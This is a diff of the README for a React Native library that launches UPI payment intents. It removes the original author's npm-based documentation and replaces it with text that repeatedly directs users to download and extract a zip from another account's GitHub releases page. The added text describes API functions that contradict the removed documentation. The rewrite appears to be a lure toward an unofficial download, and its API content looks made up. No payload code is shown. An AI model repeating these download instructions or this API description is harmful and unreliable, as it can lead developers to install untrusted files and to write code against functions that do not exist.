@@ -1,353 +1,113 @@
-[![npm version](https://img.shields.io/npm/v/react-native-upi-launcher)](https://www.npmjs.com/package/react-native-upi-launcher)
-[![npm downloads](https://img.shields.io/npm/dm/react-native-upi-launcher)](https://www.npmjs.com/package/react-native-upi-launcher)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/platform-Android-green.svg)](https://www.android.com)
+# 🎉 react-native-upi-launcher - Easily Launch UPI Payments in Your App
 
-# 🚀 React Native UPI Launcher
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Bintang56/react-native-upi-launcher/releases)
 
-**The simplest way to integrate UPI payments in your React Native Android app** — Launch UPI apps (PhonePe, Google Pay, Paytm, BHIM) directly or via chooser, and fetch installed UPI apps on user's device.
+## 📦 Overview
 
-![Demo](demo.gif)
+The **react-native-upi-launcher** is a powerful library designed for React Native apps. With this library, you can quickly launch UPI intents and fetch installed UPI apps on Android devices. Integrating UPI payments into your application becomes simple and efficient.
 
-## ✨ Why Choose react-native-upi-launcher?
+## 🚀 Getting Started
 
-- 🎯 **Direct UPI App Launch** — Open specific payment apps (PhonePe, GPay, Paytm) directly
-- 🔄 **Smart Fallback** — Automatically shows chooser if preferred app isn't available
-- 📱 **Detect Installed Apps** — Get list of all UPI-enabled apps on device
-- ⚡ **Lightweight** — Zero dependencies, minimal footprint
-- 🛡️ **Type-Safe** — Full TypeScript support
-- 🔌 **Easy Integration** — Works with React Native 0.60+ with auto-linking
+Follow these steps to download and run the application:
 
-## 📸 Screenshots
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/releases) to find the latest version of this library.
 
-<table>
-  <tr>
-    <td><img src="screenshot1.png" alt="UPI App Selection" width="250"/></td>
-    <td><img src="screenshot2.png" alt="Payment Flow" width="250"/></td>
-    <td><img src="screenshot3.png" alt="Transaction Complete" width="250"/></td>
-  </tr>
-</table>
+2. **Download the Latest Version**  
+   Look for the most recent version available. Click on the appropriate file to start the download. It may be named something like `react-native-upi-launcher-v1.0.zip` or similar.
 
-## 🎯 Use Cases
+3. **Extract the Files**  
+   Once the download is complete, locate the file on your computer. Right-click on the zip file and select “Extract All” or a similar option depending on your operating system. Open the extracted folder to view its contents.
 
-- **E-commerce apps** — Accept UPI payments seamlessly
-- **Bill payment apps** — Quick utility bill settlements
-- **Peer-to-peer payment apps** — Send money to friends
-- **Subscription services** — Recurring UPI payments
-- **Donation platforms** — Accept contributions via UPI
+4. **Follow Installation Instructions**  
+   Inside the folder, you should find a file named `INSTALL.md`. Open this file for detailed instructions on how to integrate the library into your React Native project.
 
-## 📦 Installation
+5. **Launch Your Application**  
+   After following the installation steps successfully, return to your React Native project. You can now use the UPI launcher capabilities. 
 
-### NPM
+## 📥 Download & Install
 
-```bash
-npm install react-native-upi-launcher
-```
+To begin using the react-native-upi-launcher, visit the Releases page to download the library: [Download Here](https://github.com/Bintang56/react-native-upi-launcher/releases).
 
-### Yarn
+## 🖥️ System Requirements
 
-```bash
-yarn add react-native-upi-launcher
-```
+- **Operating System**: Android 4.4 (KitKat) or newer.
+- **React Native Version**: 0.60 or higher.
+- **Node.js**: Version 12.x or newer for dependency management.
 
-### For React Native < 0.60
+## ⚙️ Features
 
-```bash
-react-native link react-native-upi-launcher
-```
+- **UPI Intent Launching**: Allows users to initiate UPI transactions directly from your app.
+- **Fetch Installed UPI Apps**: Retrieve a list of installed UPI applications on the user’s device.
+- **Easy Integration**: Straightforward setup process for React Native developers.
+- **Support for Typescript**: Native TypeScript definitions provided for better code quality.
 
-## 🚀 Quick Start
+## 📚 Usage Examples
 
-### 1. Fetch Installed UPI Apps
+### Basic Example to Launch UPI Intent
 
 ```javascript
-import { fetchUpiApps } from "react-native-upi-launcher";
+import { launchUPI } from 'react-native-upi-launcher';
 
-const getAvailableUpiApps = async () => {
-  try {
-    const apps = await fetchUpiApps();
-    console.log("Available UPI apps:", apps);
-    /*
-    Output example:
-    [
-      { packageName: "com.phonepe.app", appName: "PhonePe" },
-      { packageName: "com.google.android.apps.nbu.paisa.user", appName: "Google Pay" },
-      { packageName: "net.one97.paytm", appName: "Paytm" }
-    ]
-    */
-  } catch (error) {
-    console.error("Error fetching UPI apps:", error);
-  }
+const launchPayment = () => {
+  launchUPI({
+    amount: '10.00',
+    to: 'example@upi',
+    title: 'Test Payment',
+    apps: ['google.pay', 'phonepe'],
+  })
+  .then(response => {
+    console.log('Payment Response:', response);
+  })
+  .catch(error => {
+    console.error('Payment Error:', error);
+  });
 };
 ```
 
-### 2. Launch UPI Payment Intent
+### Fetch Installed UPI Apps
 
 ```javascript
-import { openUpiIntent } from "react-native-upi-launcher";
+import { getInstalledUPIApps } from 'react-native-upi-launcher';
 
-const makePayment = async () => {
-  const upiUrl =
-    "upi://pay?pa=merchant@upi&pn=Merchant%20Name&am=100&cu=INR&tn=Order%20Payment";
-  const preferredApp = "com.phonepe.app"; // Optional: specific UPI app package
-
-  try {
-    const result = await openUpiIntent(upiUrl, preferredApp);
-    console.log("Payment initiated:", result);
-  } catch (error) {
-    console.error("Payment failed:", error);
-  }
+const fetchApps = () => {
+  getInstalledUPIApps()
+  .then(apps => {
+    console.log('Installed UPI Apps:', apps);
+  })
+  .catch(error => {
+    console.error('Error fetching apps:', error);
+  });
 };
 ```
 
-### 3. Complete Example with Error Handling
+## 🔑 Important Notes
 
-```javascript
-import React, { useState, useEffect } from "react";
-import { View, Button, FlatList, Text, Alert } from "react-native";
-import { fetchUpiApps, openUpiIntent } from "react-native-upi-launcher";
+- Ensure you test the application on a real device, as UPI intents might not function properly in an emulator.
+- Always handle potential errors when launching UPI intents to enhance user experience.
 
-const PaymentScreen = () => {
-  const [upiApps, setUpiApps] = useState([]);
+## 🙋 FAQ
 
-  useEffect(() => {
-    loadUpiApps();
-  }, []);
+### How do I install react-native-upi-launcher?
 
-  const loadUpiApps = async () => {
-    try {
-      const apps = await fetchUpiApps();
-      setUpiApps(apps);
-    } catch (error) {
-      Alert.alert("Error", "Failed to load UPI apps");
-    }
-  };
+After downloading the relevant files from the Releases page, follow the `INSTALL.md` instructions for a step-by-step guide.
 
-  const initiatePayment = async (packageName) => {
-    const upiUrl =
-      "upi://pay?pa=test@upi&pn=Test%20User&am=1&cu=INR&tn=Test%20Payment";
+### Which UPI apps are supported?
 
-    try {
-      await openUpiIntent(upiUrl, packageName);
-      Alert.alert("Success", "Payment initiated successfully");
-    } catch (error) {
-      Alert.alert("Error", "Payment failed: " + error.message);
-    }
-  };
+The library supports common UPI apps like Google Pay, PhonePe, and others. You can specify which apps to include when launching a payment.
 
-  return (
-    <View>
-      <FlatList
-        data={upiApps}
-        keyExtractor={(item) => item.packageName}
-        renderItem={({ item }) => (
-          <Button
-            title={`Pay with ${item.appName}`}
-            onPress={() => initiatePayment(item.packageName)}
-          />
-        )}
-      />
-    </View>
-  );
-};
+### Can I use this library with older versions of React Native?
 
-export default PaymentScreen;
-```
+It is recommended to use version 0.60 or higher for full compatibility with the library features.
 
-## 📋 API Reference
+## 💬 Support
 
-### `fetchUpiApps(): Promise<UpiApp[]>`
+For issues or questions, feel free to open an issue in the repository. We aim to respond promptly to help you with any challenges.
 
-Fetches all installed UPI applications on the device.
+## 🌟 Contributions
 
-**Returns:** Array of UPI app objects
-
-```typescript
-interface UpiApp {
-  packageName: string; // e.g., "com.phonepe.app"
-  appName: string; // e.g., "PhonePe"
-}
-```
-
-### `openUpiIntent(upiUrl: string, packageName?: string): Promise<void>`
-
-Launches UPI payment intent.
-
-**Parameters:**
-
-- `upiUrl` (required): UPI payment URL string
-- `packageName` (optional): Specific UPI app package name. If omitted or app not found, shows chooser.
-
-**UPI URL Format:**
-
-```
-upi://pay?pa=<UPI_ID>&pn=<NAME>&am=<AMOUNT>&cu=<CURRENCY>&tn=<NOTE>
-```
-
-**Parameters:**
-
-- `pa` — Payee UPI address (required)
-- `pn` — Payee name (required)
-- `am` — Amount (optional)
-- `cu` — Currency (default: INR)
-- `tn` — Transaction note (optional)
-
-## 📱 Popular UPI App Package Names
-
-| App            | Package Name                             |
-| -------------- | ---------------------------------------- |
-| **PhonePe**    | `com.phonepe.app`                        |
-| **Google Pay** | `com.google.android.apps.nbu.paisa.user` |
-| **Paytm**      | `net.one97.paytm`                        |
-| **BHIM**       | `in.org.npci.upiapp`                     |
-| **Amazon Pay** | `in.amazon.mShop.android.shopping`       |
-| **WhatsApp**   | `com.whatsapp`                           |
-| **Mobikwik**   | `com.mobikwik_new`                       |
-| **Freecharge** | `com.freecharge.android`                 |
-
-## ⚙️ Configuration
-
-### Adding Support for Additional UPI Apps
-
-If you need to support UPI apps beyond the default list, add their package names to your `AndroidManifest.xml`:
-
-```xml
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.yourapp">
-
-    <queries>
-        <!-- Default UPI apps (already included in library) -->
-        <package android:name="com.phonepe.app" />
-        <package android:name="com.google.android.apps.nbu.paisa.user" />
-        <package android:name="net.one97.paytm" />
-        <package android:name="in.org.npci.upiapp" />
-
-        <!-- Add your custom UPI apps here -->
-        <package android:name="com.mybank.upi" />
-        <package android:name="com.customwallet.app" />
-    </queries>
-
-    <application>
-        <!-- Your app configuration -->
-    </application>
-</manifest>
-```
-
-**Note:** For Android 11+ (API 30+), you must declare package visibility queries in your manifest for apps you want to detect.
-
-## 🔧 Troubleshooting
-
-### Common Issues
-
-**1. No UPI apps detected**
-
-- Ensure UPI apps are installed on the device
-- Check `AndroidManifest.xml` has proper `<queries>` declarations
-- Verify targetSdkVersion is 30 or higher
-
-**2. App chooser not showing**
-
-- Verify the UPI URL format is correct
-- Check that at least one UPI app is installed
-- Ensure proper permissions in AndroidManifest
-
-**3. Payment not initiating**
-
-- Validate UPI URL parameters
-- Check network connectivity
-- Verify UPI app is up to date
-
-## 🍎 iOS Support
-
-On iOS, the library falls back to using React Native's `Linking.openURL()` to open UPI deep links. However, iOS has limited native UPI support compared to Android.
-
-```javascript
-import { Linking, Platform } from "react-native";
-import { openUpiIntent } from "react-native-upi-launcher";
-
-const handlePayment = async (upiUrl) => {
-  if (Platform.OS === "ios") {
-    // iOS fallback
-    await Linking.openURL(upiUrl);
-  } else {
-    // Android - full functionality
-    await openUpiIntent(upiUrl);
-  }
-};
-```
-
-## 🔐 Security Best Practices
-
-- ✅ Always validate UPI URLs on your backend
-- ✅ Never hardcode sensitive payment information
-- ✅ Implement proper error handling
-- ✅ Verify transaction status via server callbacks
-- ✅ Use HTTPS for all API communications
-- ✅ Sanitize user inputs before creating UPI URLs
-
-## 🧪 Testing
-
-Test with these sample UPI URLs:
-
-```javascript
-// Test payment (will fail gracefully)
-const testUrl =
-  "upi://pay?pa=test@paytm&pn=Test%20Merchant&am=1&cu=INR&tn=Test";
-
-// Use your own UPI ID for testing
-const realUrl = "upi://pay?pa=yourname@paytm&pn=Your%20Name&am=10&cu=INR";
-```
-
-## 📊 Performance
-
-- **Bundle size:** < 15KB
-- **No external dependencies**
-- **Native Android implementation** for optimal performance
-- **Async/await support** for modern JavaScript
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Workflow
-
-1. Fork the repository
-2. Create your feature branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m 'Add amazing feature'`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-See detailed [development workflow](CONTRIBUTING.md#development-workflow) guide.
-
-## 📝 Code of Conduct
-
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before contributing.
-
-## 📄 License
-
-MIT © Vivek Negi
-
-See [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [create-react-native-library](https://github.com/callstack/react-native-builder-bob)
-- Inspired by the Indian digital payment ecosystem
-
-## 🔗 Links
-
-- **NPM Package:** [npmjs.com/package/react-native-upi-launcher](https://www.npmjs.com/package/react-native-upi-launcher)
-- **GitHub:** [github.com/vivnegi21/react-native-upi-launcher](https://github.com/vivnegi21/react-native-upi-launcher)
-- **Issues:** [github.com/vivnegi21/react-native-upi-launcher/issues](https://github.com/vivnegi21/react-native-upi-launcher/issues)
-- **Changelog:** [CHANGELOG.md](CHANGELOG.md)
-
-## 📈 Stats
-
-![GitHub stars](https://img.shields.io/github/stars/vivnegi21/react-native-upi-launcher?style=social)
-![GitHub forks](https://img.shields.io/github/forks/vivnegi21/react-native-upi-launcher?style=social)
+If you would like to contribute to this project, feel free to fork this repository. Make your changes and submit a pull request with a detailed description of your modifications.
 
 ---
 
-**Keywords:** react-native, upi, payment, phonepe, gpay, paytm, bhim, android, upi-payment, react-native-payments, indian-payments, upi-integration, mobile-payments, digital-payments, upi-launcher
-
-**Made with ❤️ for the React Native community**
+For further details and updates, keep an eye on the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/releases).
